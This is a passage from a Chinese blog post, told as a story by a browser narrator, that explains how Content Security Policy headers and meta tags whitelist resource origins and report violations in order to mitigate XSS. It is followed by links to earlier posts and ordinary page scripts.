<h2 id="csp">CSP<a hidden class="anchor" aria-hidden="true" href="#csp">#</a></h2>
<p>这一天中午，没什么工作要忙，我又想起了这个问题，小雪他们又组织打麻将，我没有心思便拒绝了。</p>
<p>老白闻讯过来，说到：“小风，你还在想那个问题啊，你这两天没看新闻吗，W3C标准化组织推出了一个新技术，已经把这个问题解决了！”</p>
<p>老白的话如当头一棒，“什么技术？怎么解决的？”</p>
<p><img loading="lazy" src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/6/5/17281ce4b4bcfa4c~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.png" alt=""  />
</p>
<p>“你看你，天天关起门来研究，都不知道外面的世界变化有多快。你去了解一下，好像叫什么<code>Content Security Policy</code>，哦对，就是这个，简称叫<code>CSP</code>”</p>
<p>我赶紧去打听了这个叫CSP的新技术，看完直拍大腿，我怎么就没想到。</p>
<p>CSP规定了一个叫<code>Content-Security-Policy</code>的信息，网站通过这个信息告诉浏览器哪些外部资源可以加载和执行。这个信息可以用HTTP头的形式出现，像这样：</p>
<p><img loading="lazy" src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/6/5/17281ce4bed92174~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.png" alt=""  />
</p>
<p>也可以通过 <strong><meta></strong> 标签出现，像这样：</p>
<p>代码解读</p>
<p>复制代码</p>
<p><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot;        content=&quot;script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;</code></p>
<p>至于里面的内容，则是将所有可能出现外部资源加载的地方进行了指示，浏览器拿到它就能知道能去哪些地址加载对应的资源，如果资源所在的地址不在名单之内就拒绝加载：</p>
<p>代码解读</p>
<p>复制代码</p>
<p><code>- script-src：外部脚本 - style-src：样式表 - img-src：图像 - media-src：媒体文件（音频和视频） - font-src：字体文件 - object-src：插件（比如 Flash） - child-src：框架 - frame-ancestors：嵌入的外部资源 - connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等） - worker-src：worker脚本 - manifest-src：manifest 文件</code></p>
<p>比如 img-src的内容是<code>self</code>，那所有的 <strong><img></strong> 标签的src属性必须是在当前网站才行，如果加载其他地址的图片就会拒绝。</p>
<p>不仅如此，还提供了一个叫<code>report-uri</code>的字段，字段内容是一个服务器地址，浏览器发现有不符合规定的资源加载后，除了拒绝加载还可以把这一情况报告给这个地址，网站就能及时知道预警了。</p>
<p>真是完美的解决方案！没想到，竟然这么多竞争对手都已经用上了这项技术</p>
<p><img loading="lazy" src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/6/5/17281ce4d500b523~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.png" alt=""  />
</p>
<p>当天下午，我就拉着老白去到领导办公室，说服他将这项技术在咱们公司也用起来。</p>
<p>烦人的XSS攻击总算是缓解了不少，我们也难得度过了一段时间的太平日子。</p>
<p><strong>未完待续······</strong></p>
<h2 id="彩蛋">彩蛋<a hidden class="anchor" aria-hidden="true" href="#彩蛋">#</a></h2>
<blockquote>
<p>太平的日子没有太持久，那件事之后半个月，我又因为执行一段JS代码霸占CPU太久，被帝国安全警卫队勒令我们浏览器公司强制关闭。</p>
<p>执行JavaScript这份工是越来越不好打了。</p>
<p><em>预知后事如何，请关注后续精彩······</em></p>
</blockquote>
<h2 id="往期热门回顾">往期热门回顾<a hidden class="anchor" aria-hidden="true" href="#往期热门回顾">#</a></h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FK15IVpe57STOf0SxyLEg9A" title="https://mp.weixin.qq.com/s/K15IVpe57STOf0SxyLEg9A">因为一个跨域请求，我差点丢了饭碗</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fjx0EajGXGrM3fR14P9Bm7Q" title="https://mp.weixin.qq.com/s/jx0EajGXGrM3fR14P9Bm7Q">就为了一个原子操作，其他CPU核心都罢工了</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fjx0EajGXGrM3fR14P9Bm7Q" title="https://mp.weixin.qq.com/s/jx0EajGXGrM3fR14P9Bm7Q">完了！CPU一味求快出事儿了！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FXEDCCQntIRghWhfigciWSA" title="https://mp.weixin.qq.com/s/XEDCCQntIRghWhfigciWSA">可怕！CPU竟成了黑客的帮凶！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FerSqe-nItuQPxW4MT3LEVg" title="https://mp.weixin.qq.com/s/erSqe-nItuQPxW4MT3LEVg">哈希表哪家强？几大编程语言吵起来了！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FmhsIoabAVOyTrBXKGZjD_g" title="https://mp.weixin.qq.com/s/mhsIoabAVOyTrBXKGZjD_g">震撼！全网第一张源码分析全景图揭秘Nginx</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FhFWSItFYIzWLr_RFne2lBA" title="https://mp.weixin.qq.com/s/hFWSItFYIzWLr_RFne2lBA">一个整数＋1引发的灾难</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FKZ3-PeYWBBos40spbqiTRA" title="https://mp.weixin.qq.com/s/KZ3-PeYWBBos40spbqiTRA">一网打尽！每个程序猿都该了解的黑客技术大汇总</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FCYoaJfV9btYBFWD7ZGLVng" title="https://mp.weixin.qq.com/s/CYoaJfV9btYBFWD7ZGLVng">DDoS攻击：无限战争</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FQWuhgrT7LEqq06NxdvfaeA" title="https://mp.weixin.qq.com/s/QWuhgrT7LEqq06NxdvfaeA">一个Java对象的回忆录：垃圾回收</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FOZ6ZOoGULUgRRaL_qw9bFA" title="https://mp.weixin.qq.com/s/OZ6ZOoGULUgRRaL_qw9bFA">谁动了你的HTTPS流量？</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F1_pDD-V4Qa5k22NOoruNMg" title="https://mp.weixin.qq.com/s/1_pDD-V4Qa5k22NOoruNMg">路由器里的广告秘密</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FaxPUi-8kHtFQTwgRtyZtGQ" title="https://mp.weixin.qq.com/s/axPUi-8kHtFQTwgRtyZtGQ">一个HTTP数据包的奇幻之旅</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FYDEwVD9MudthkTTCshJF3w" title="https://mp.weixin.qq.com/s/YDEwVD9MudthkTTCshJF3w">我是一个流氓软件线程</a></p>
<p><img loading="lazy" src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/6/5/17281ce4df63d0d6~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.png" alt=""  />
</p>
<p><img loading="lazy" src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/6/5/17281ce4e45142ff~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.png" alt=""  />
</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/javascript/">JavaScript</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/posts/wiki/%E4%BC%98%E5%8C%96%E8%AE%B0%E5%BD%95/">
    <span class="title">« 上一页</span>
    <br>
    <span>优化记录</span>
  </a>
  <a class="next" href="http://localhost:1313/posts/wiki/sdk%E4%BA%8C%E6%AC%A1n%E6%AC%A1%E5%B0%81%E8%A3%85/">
    <span class="title">下一页 »</span>
    <br>
    <span>sdk二次（n次）封装</span>
  </a>
</nav>


<ul class="share-buttons">
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share 一个神秘URL酿大祸，差点让我背锅！ on x"
            href="https://x.com/intent/tweet/?text=%e4%b8%80%e4%b8%aa%e7%a5%9e%e7%a7%98URL%e9%85%bf%e5%a4%a7%e7%a5%b8%ef%bc%8c%e5%b7%ae%e7%82%b9%e8%ae%a9%e6%88%91%e8%83%8c%e9%94%85%ef%bc%81&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fjuejin%2f%25E4%25B8%2580%25E4%25B8%25AA%25E7%25A5%259E%25E7%25A7%2598url%25E9%2585%25BF%25E5%25A4%25A7%25E7%25A5%25B8%25E5%25B7%25AE%25E7%2582%25B9%25E8%25AE%25A9%25E6%2588%2591%25E8%2583%258C%25E9%2594%2585%2f&amp;hashtags=JavaScript">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share 一个神秘URL酿大祸，差点让我背锅！ on linkedin"
            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fjuejin%2f%25E4%25B8%2580%25E4%25B8%25AA%25E7%25A5%259E%25E7%25A7%2598url%25E9%2585%25BF%25E5%25A4%25A7%25E7%25A5%25B8%25E5%25B7%25AE%25E7%2582%25B9%25E8%25AE%25A9%25E6%2588%2591%25E8%2583%258C%25E9%2594%2585%2f&amp;title=%e4%b8%80%e4%b8%aa%e7%a5%9e%e7%a7%98URL%e9%85%bf%e5%a4%a7%e7%a5%b8%ef%bc%8c%e5%b7%ae%e7%82%b9%e8%ae%a9%e6%88%91%e8%83%8c%e9%94%85%ef%bc%81&amp;summary=%e4%b8%80%e4%b8%aa%e7%a5%9e%e7%a7%98URL%e9%85%bf%e5%a4%a7%e7%a5%b8%ef%bc%8c%e5%b7%ae%e7%82%b9%e8%ae%a9%e6%88%91%e8%83%8c%e9%94%85%ef%bc%81&amp;source=http%3a%2f%2flocalhost%3a1313%2fposts%2fjuejin%2f%25E4%25B8%2580%25E4%25B8%25AA%25E7%25A5%259E%25E7%25A7%2598url%25E9%2585%25BF%25E5%25A4%25A7%25E7%25A5%25B8%25E5%25B7%25AE%25E7%2582%25B9%25E8%25AE%25A9%25E6%2588%2591%25E8%2583%258C%25E9%2594%2585%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share 一个神秘URL酿大祸，差点让我背锅！ on reddit"
            href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fjuejin%2f%25E4%25B8%2580%25E4%25B8%25AA%25E7%25A5%259E%25E7%25A7%2598url%25E9%2585%25BF%25E5%25A4%25A7%25E7%25A5%25B8%25E5%25B7%25AE%25E7%2582%25B9%25E8%25AE%25A9%25E6%2588%2591%25E8%2583%258C%25E9%2594%2585%2f&title=%e4%b8%80%e4%b8%aa%e7%a5%9e%e7%a7%98URL%e9%85%bf%e5%a4%a7%e7%a5%b8%ef%bc%8c%e5%b7%ae%e7%82%b9%e8%ae%a9%e6%88%91%e8%83%8c%e9%94%85%ef%bc%81">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share 一个神秘URL酿大祸，差点让我背锅！ on facebook"
            href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2fjuejin%2f%25E4%25B8%2580%25E4%25B8%25AA%25E7%25A5%259E%25E7%25A7%2598url%25E9%2585%25BF%25E5%25A4%25A7%25E7%25A5%25B8%25E5%25B7%25AE%25E7%2582%25B9%25E8%25AE%25A9%25E6%2588%2591%25E8%2583%258C%25E9%2594%2585%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share 一个神秘URL酿大祸，差点让我背锅！ on whatsapp"
            href="https://api.whatsapp.com/send?text=%e4%b8%80%e4%b8%aa%e7%a5%9e%e7%a7%98URL%e9%85%bf%e5%a4%a7%e7%a5%b8%ef%bc%8c%e5%b7%ae%e7%82%b9%e8%ae%a9%e6%88%91%e8%83%8c%e9%94%85%ef%bc%81%20-%20http%3a%2f%2flocalhost%3a1313%2fposts%2fjuejin%2f%25E4%25B8%2580%25E4%25B8%25AA%25E7%25A5%259E%25E7%25A7%2598url%25E9%2585%25BF%25E5%25A4%25A7%25E7%25A5%25B8%25E5%25B7%25AE%25E7%2582%25B9%25E8%25AE%25A9%25E6%2588%2591%25E8%2583%258C%25E9%2594%2585%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share 一个神秘URL酿大祸，差点让我背锅！ on telegram"
            href="https://telegram.me/share/url?text=%e4%b8%80%e4%b8%aa%e7%a5%9e%e7%a7%98URL%e9%85%bf%e5%a4%a7%e7%a5%b8%ef%bc%8c%e5%b7%ae%e7%82%b9%e8%ae%a9%e6%88%91%e8%83%8c%e9%94%85%ef%bc%81&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fjuejin%2f%25E4%25B8%2580%25E4%25B8%25AA%25E7%25A5%259E%25E7%25A7%2598url%25E9%2585%25BF%25E5%25A4%25A7%25E7%25A5%25B8%25E5%25B7%25AE%25E7%2582%25B9%25E8%25AE%25A9%25E6%2588%2591%25E8%2583%258C%25E9%2594%2585%2f">
            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
                <path
                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share 一个神秘URL酿大祸，差点让我背锅！ on ycombinator"
            href="https://news.ycombinator.com/submitlink?t=%e4%b8%80%e4%b8%aa%e7%a5%9e%e7%a7%98URL%e9%85%bf%e5%a4%a7%e7%a5%b8%ef%bc%8c%e5%b7%ae%e7%82%b9%e8%ae%a9%e6%88%91%e8%83%8c%e9%94%85%ef%bc%81&u=http%3a%2f%2flocalhost%3a1313%2fposts%2fjuejin%2f%25E4%25B8%2580%25E4%25B8%25AA%25E7%25A5%259E%25E7%25A7%2598url%25E9%2585%25BF%25E5%25A4%25A7%25E7%25A5%25B8%25E5%25B7%25AE%25E7%2582%25B9%25E8%25AE%25A9%25E6%2588%2591%25E8%2583%258C%25E9%2594%2585%2f">
            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
                <path
                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
            </svg>
        </a>
    </li>
</ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span><a href="https://beian.miit.gov.cn/">粤ICP备2023039897号-1</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
